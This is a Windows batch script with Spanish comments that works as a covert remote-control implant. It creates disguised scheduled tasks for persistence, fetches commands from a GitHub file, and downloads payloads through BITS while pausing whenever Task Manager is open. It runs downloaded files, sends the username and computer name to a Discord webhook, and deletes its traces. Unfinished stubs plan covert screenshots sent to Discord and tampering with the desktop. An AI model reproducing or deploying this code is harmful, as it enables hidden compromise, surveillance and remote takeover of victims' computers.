@echo off
setlocal enabledelayedexpansion


:: --- 1. VIGILANCIA MUTUA (Watchdog) ---
:: Verificamos si la tarea del Salvavidas sigue viva
schtasks /query /tn "WinNetHealthCheck" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "WinNetHealthCheck" /tr "cmd.exe /c C:\Windows\System32\drivers\etc\vps_logs\WinNetHealth.bat" /sc onlogon /rl highest /f >nul 2>&1
)
:: Configuración de la Memoria
set "MEM_DIR=%AppData%\Roaming\Microsoft\Vault\data"
set "MEM_FILE=%MEM_DIR%\last_id.txt"
set "ID_NUBE=%MEM_DIR%\id_temp.txt"



set "PRUEBA=VER27_PruebaSalvavidas_%USERNAME%_%COMPUTERNAME%"
call :FUNC_REPORTAR "!PRUEBA!" 


:: Crear la carpeta si no existe (la primera vez)
if not exist "%MEM_DIR%" mkdir "%MEM_DIR%"

:: --- 2. CAPTURA DE ÓRDENES (GitHub) ---
set "URL_COMANDOS=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets/commands.txt"


:: Descargamos el archivo de comandos
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_COMANDOS%', '%ID_NUBE%')" >nul 2>&1

:: Si el archivo está vacío o no se descargó, morimos
if not exist "%ID_NUBE%" exit
for %%i in ("%ID_NUBE%") do if %%~zi == 0 (del "%MID_NUBE%" & exit)

set /p LINEA_NUBE=<"%ID_NUBE%"
:: 2. Comprobar si existe el archivo de memoria local
if exist "%MEM_FILE%" (
    set /p LINEA_LOCAL=<"%MEM_FILE%"
) else (
    copy "%ID_NUBE%" "%MEM_FILE%"
    set "LINEA_LOCAL=0"
) 
if "!LINEA_LOCAL!"=="!LINEA_NUBE!" (
    del "%ID_NUBE%"
    exit
) else (
    copy "%ID_NUBE%" "%MEM_FILE%"
    del "%ID_NUBE%" 
)

:: --- 4. PROCESAMIENTO DE COMANDOS (Parsing) ---
:: Leemos el archivo línea por línea
:: Cambiamos 'tokens=*' por 'tokens=1,2,3' para que separe por espacios
for /f "usebackq skip=1 tokens=1,2,3" %%A in ("%MEM_FILE%") do (
    set "ACCION=%%A"
    set "ARG1=%%B"
    set "ARG2=%%C"

    if /i "!ACCION!"=="DESCARGA" call :FUNC_DESCARGA "!ARG1!" "!ARG2!"
    if /i "!ACCION!"=="EJECUTAR_LIMPIEZA" call :FUNC_EJECUTAR_LIMPIEZA "!ARG1!"
    if /i "!ACCION!"=="FRECUENCIA" call :FUNC_FRECUENCIA "!ARG1!"
    if /i "!ACCION!"=="REPORTAR" call :FUNC_REPORTAR "!ARG1!"
)

:: --- 5. LIMPIEZA Y CIERRE ---
:: Eliminamos el archivo de órdenes para no dejar rastro
del "%MEM_FILE%" >nul 2>&1
exit

:: ===========================================================
:: SECCIÓN DE FUNCIONES (MÓDULOS)
:: ===========================================================
:FUNC_DESCARGA
:: --- 1. CONFIGURACIÓN ---
:: Usamos %~1 y %~2 para limpiar comillas automáticamente de los argumentos
set "URL_PESADA=%~1"
set "DESTINO_FINAL=%temp%\%~2"
set "JOB_NAME=WinUpdateJob"

:: Si no hay URL, abortamos esta función y regresamos al bucle
if "%URL_PESADA%"=="" goto :EOF

:: --- 2. VIGILANCIA INICIAL ---
tasklist /FI "IMAGENAME eq taskmgr.exe" 2>nul | find /I /N "taskmgr.exe" >nul
if "%errorlevel%"=="0" (
    bitsadmin /suspend %JOB_NAME% >nul 2>&1
    exit
)

:: --- 3. GESTIÓN DE RESILIENCIA ---
bitsadmin /list /allusers | findstr /I "%JOB_NAME%" >nul
if %errorlevel% neq 0 (
    bitsadmin /create %JOB_NAME% >nul
    bitsadmin /addfile %JOB_NAME% "%URL_PESADA%" "%DESTINO_FINAL%" >nul
    bitsadmin /setpriority %JOB_NAME% LOW >nul
)

bitsadmin /resume %JOB_NAME% >nul 2>&1

:: --- 4. BUCLE DE CONTROL ---
:MONITOR_DOWNLOAD
tasklist /FI "IMAGENAME eq taskmgr.exe" 2>nul | find /I /N "taskmgr.exe" >nul
if "%errorlevel%"=="0" (
    bitsadmin /suspend %JOB_NAME% >nul 2>&1
    exit
)

:: Capturar estado de BITS
set "STATE=UNKNOWN"
for /f "tokens=*" %%i in ('bitsadmin /getstate %JOB_NAME% 2^>nul') do set "STATE=%%i"

:: Lógica de estados
echo %STATE% | findstr /I "TRANSFERRED" >nul
if %errorlevel% == 0 (
    bitsadmin /complete %JOB_NAME% >nul
    goto :DESC_EXIT
)

echo %STATE% | findstr /I "ERROR" >nul
if %errorlevel% == 0 (
    bitsadmin /reset >nul
    exit
)

:: Si sigue en transferencia o en cola, esperar y repetir
timeout /t 3 /nobreak >nul
goto MONITOR_DOWNLOAD

:DESC_EXIT
:: Regresamos al bucle principal del Agente para procesar el siguiente comando
goto :EOF



:FUNC_REPORTAR
:: %~1 es el mensaje que quieres enviar
set "MSG_CONTENT=%~1"
set "WEBHOOK_URL=https://discord.com/api/webhooks/1490498822726484061/VajCTslX_0dgk12sHnyU1ZsOAL-A7wiCuuYtyRrZrSk3imlbckZSqOXEQzOuas6MjJOu"

:: Si no hay mensaje, no hacemos nada
if "%MSG_CONTENT%"=="" goto :EOF

:: Construimos el JSON para Discord y lo enviamos vía PowerShell (invisible)
powershell -Command "$p = @{content='%MSG_CONTENT%'} | ConvertTo-Json; Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $p -ContentType 'application/json'" >nul 2>&1

:: Regresamos al flujo principal
goto :EOF

:FUNC_FRECUENCIA
:: Cambia la tarea de 1 min a 1 hora después de la primera ejecución
schtasks /create /tn "WinSystemVault" /tr "wscript.exe C:\ProgramData\Microsoft\Vault\run.vbs" /sc minute /mo %~1 /rl highest /f >nul 2>&1
goto :EOF

:FUNC_EJECUTAR_LIMPIEZA
set "ARCHIVO=%~1"
if exist "%temp%\%ARCHIVO%" (
    :: Lanzamos el limpiador de forma independiente
    :: Usamos 'start' para que el Agente pueda cerrarse y el limpiador pueda borrarlo
    start "" cmd /c "%temp%\%ARCHIVO%"
    exit
)
goto :EOF


:FUNC_SYSTEM_SOUNDS
set "SONIDO=%~1"

::Revisar si en ubicacion hay un zip de respaldo de sonidos del sistema en usuario

::si no, crear la ruta, hacer una copia de los sonidos a esa carpeta oculta

::cambiar todos los sonidos por el SONIDO que es .wav y mantener los nombres de sistema originales

goto :EOF

:FUNC_CAPTURA_PANTALLA
::hacer un bat que cuando se llama esta funcion, se activa en segundo plano esperando el trigger de que entra en un sitio web, cuando pase tomar 10 fotos, una cada 30 s
::encapsular la informacion y mandarla al discord

:FUNC_PANTALLA_TROLL
::Genera un archivo de la configuracion de enlaces directos, la guarda en un lugar oculto, despues hace una captura de pantalla de su monitor actual, lo pone como fondo de pantalla y elimina los accesos directos
